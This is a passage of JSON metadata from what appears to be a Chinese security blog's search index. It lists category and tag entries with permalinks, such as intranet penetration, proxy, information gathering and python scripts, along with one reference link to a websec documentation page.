文章主要参考：https://websec.readthedocs.io/zh/latest/intranet/windows/info.html#section-5","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://ruan0423.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]}],"categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"python","slug":"python","permalink":"https://ruan0423.github.io/categories/python/"},{"name":"说明","slug":"说明","permalink":"https://ruan0423.github.io/categories/%E8%AF%B4%E6%98%8E/"}],"tags":[{"name":"代理","slug":"代理","permalink":"https://ruan0423.github.io/tags/%E4%BB%A3%E7%90%86/"},{"name":"信息收集","slug":"信息收集","permalink":"https://ruan0423.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"代码 python 开发 脚本","slug":"代码-python-开发-脚本","permalink":"https://ruan0423.github.io/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/"},{"name":"说明","slug":"说明","permalink":"https://ruan0423.github.io/tags/%E8%AF%B4%E6%98%8E/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://ruan0423.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]}